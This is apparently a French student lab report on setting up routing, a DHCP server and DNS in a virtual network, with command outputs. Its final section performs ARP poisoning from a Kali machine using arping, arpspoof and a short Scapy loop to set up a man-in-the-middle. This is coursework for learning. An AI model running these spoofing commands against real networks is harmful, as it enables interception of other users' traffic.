# TP2 : Routage, DHCP et DNS

# Sommaire

- [TP2 : Routage, DHCP et DNS](#tp2--routage-dhcp-et-dns)
- [Sommaire](#sommaire)
- [II. Serveur DHCP](#ii-serveur-dhcp)
- [III. ARP](#iii-arp)
  - [1. Les tables ARP](#1-les-tables-arp)
  - [2. ARP poisoning](#2-arp-poisoning)


🌞 **Configuration de `router.tp2.efrei`**

Je suis le tuto dans le mémo Rocky pour récupérer une IP en DHCP.
```
[root@localhost ~]# ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=43.0 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=27.3 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=115 time=27.4 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=115 time=54.1 ms
64 bytes from 8.8.8.8: icmp_seq=5 ttl=115 time=33.5 ms
^C
--- 8.8.8.8 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4011ms
rtt min/avg/max/mdev = 27.255/37.054/54.112/10.276 ms

```
```
[root@localhost ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:ec:21:44 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.154/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 1870sec preferred_lft 1870sec
    inet6 fe80::a00:27ff:feec:2144/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:54:d3:73 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe54:d373/64 scope link
       valid_lft forever preferred_lft forever
```
```
[root@localhost ~]$ firewall-cmd --add-masquerade
success

[root@localhost ~]$ firewall-cmd --add-masquerade --permanent
success
```

🌞 **Configuration de `node1.tp2.efrei`**

```
PC1> show ip

NAME        : VPCS[1]
IP/MASK     : 10.2.1.1/24
GATEWAY     : 255.255.255.0
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 20006
RHOST:PORT  : 127.0.0.1:20007
MTU         : 1500
```

```
PC1> ping 10.2.1.254

84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=2.179 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=1.976 ms
84 bytes from 10.2.1.254 icmp_seq=3 ttl=64 time=4.441 ms
84 bytes from 10.2.1.254 icmp_seq=4 ttl=64 time=1.958 ms
```
```
PC1> ip 10.2.1.1/10.2.1.254
Checking for duplicate address...
PC1 : 10.2.1.1 255.255.255.0 gateway 10.2.1.254

PC1> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=26.906 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=26.196 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=26.887 ms
```
```
PC1> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   1.870 ms  1.701 ms  2.804 ms
 2   192.168.122.1   6.423 ms  2.556 ms  2.001 ms
 3   10.0.3.2   2.884 ms  3.045 ms  3.457 ms
 4     *  *  *
```
🌞 **Afficher la CAM Table du switch**

```
IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/1
   1    0800.2754.d373    DYNAMIC     Et0/0
Total Mac Addresses for this criterion: 2
```

# II. Serveur DHCP

🌞 **Install et conf du serveur DHCP** sur `dhcp.tp2.efrei`

```
nano /etc/sysconfig/network-scripts/ifcfg-enp0s3

DEVICE=enp0s3
NAME=rocky

ONBOOT=yes
BOOTPROTO=static

IPADDR=10.2.1.253
NETMASK=255.255.255.0

GATEWAY=10.2.1.254
```
```
sudo nmcli connection reload

sudo nmcli connection up rocky

sudo nmcli connection down rocky
sudo nmcli connection up rocky
```

Créer et configurer un serveur DHCP :
```
dnf -y install dhcp-server
vi /etc/dhcp/dhcpd.conf
systemctl enable --now dhcpd
```
```
authoritative;
subnet 10.2.1.0 netmask 255.255.255.0 {
    range 10.2.1.10 10.2.1.50;
    option routers 10.2.1.254;
    option broadcast-address 10.2.1.255;
}
```


🌞 **Test du DHCP** sur `node1.tp2.efrei`

```
PC1> dhcp
DORA IP 10.2.1.10/24 GW 10.2.1.254

PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         :
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 43165, 43166/21583/37770
MAC         : 00:50:79:66:68:00
LPORT       : 20006
RHOST:PORT  : 127.0.0.1:20007
MTU         : 1500
```
```
PC1> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   1.872 ms  1.649 ms  1.572 ms
 2   192.168.122.1   2.839 ms  4.067 ms  3.389 ms
 3   10.0.3.2   3.495 ms  3.459 ms  4.487 ms
 4     *  *  *

PC1> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=114 time=31.421 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=114 time=32.213 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=114 time=28.832 ms

```

🌟 **BONUS**

```
authoritative;
subnet 10.2.1.0 netmask 255.255.255.0 {
    range 10.2.1.10 10.2.1.50;
    option routers 10.2.1.254;
    option broadcast-address 10.2.1.255;
    option domain-name-servers 1.1.1.1;
}
```
```
PC1> ping www.google.com
www.google.com resolved to 142.250.178.132

84 bytes from 142.250.178.132 icmp_seq=1 ttl=114 time=28.852 ms
84 bytes from 142.250.178.132 icmp_seq=2 ttl=114 time=29.320 ms
84 bytes from 142.250.178.132 icmp_seq=3 ttl=114 time=31.757 ms
84 bytes from 142.250.178.132 icmp_seq=4 ttl=114 time=29.801 ms
84 bytes from 142.250.178.132 icmp_seq=5 ttl=114 time=27.399 ms
```

🌞 **Wireshark it !**

[Wireshark échange DHCP](./ws_dhcp.pcapng)

# III. ARP

## 1. Les tables ARP

🌞 **Affichez la table ARP de `router.tp2.efrei`**

```
[root@localhost ~]# ip neighbor show
10.2.1.253 dev enp0s8 lladdr 08:00:27:ce:98:8a STALE
10.2.1.10 dev enp0s8 lladdr 00:50:79:66:68:00 STALE
192.168.122.1 dev enp0s3 lladdr 52:54:00:24:5d:50 STALE
```

🌞 **Capturez l'échange ARP avec Wireshark**

[Wireshark échange ARP](./ws_ARP1.pcapng)

## 2. ARP poisoning

**Insérer une machine attaquante dans la topologie. Un Kali linux, ou n'importe quel autre OS de votre choix.**

🌞 **Envoyer une trame ARP arbitraire**

```
┌──(kali㉿kali)-[~]
└─$ sudo arping -I eth0 -c 1 -s 11:11:11:11:11:11 -S 10.2.1.45 10.2.1.10
ARPING 10.2.1.10
Timeout

--- 10.2.1.10 statistics ---
1 packets transmitted, 0 packets received, 100% unanswered (0 extra)
```

```
PC1> arp

11:11:11:11:11:11  10.2.1.45 expires in 67 seconds
```

🌞 **Mettre en place un ARP MITM**

```
┌──(kali㉿kali)-[~]
└─$ sudo sysctl -w net.ipv4.ip_forward=1
```
```
┌──(kali㉿kali)-[~]
└─$ sudo arpspoof -i eth0 -t 10.2.1.10 10.2.1.254 -r
8:0:27:6e:e4:5f 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at 8:0:27:6e:e4:5f
8:0:27:6e:e4:5f 8:0:27:54:d3:73 0806 42: arp reply 10.2.1.10 is-at 8:0:27:6e:e4:5f
```

🌞 **Capture Wireshark `arp_mitm.pcap`**

[Wireshark MITM](./arp_mitm.pcapng)

🌞 **Réaliser la même attaque avec Scapy**

```
rom scapy.all import *

while True:
        send(ARP(pdst="10.2.1.10", psrc="10.2.1.254"))
        send(ARP(pdst="10.2.1.254", psrc="10.2.1.10"))
```
```
PC1> arp

08:00:27:6e:e4:5f  10.2.1.254 expires in 120 seconds
```
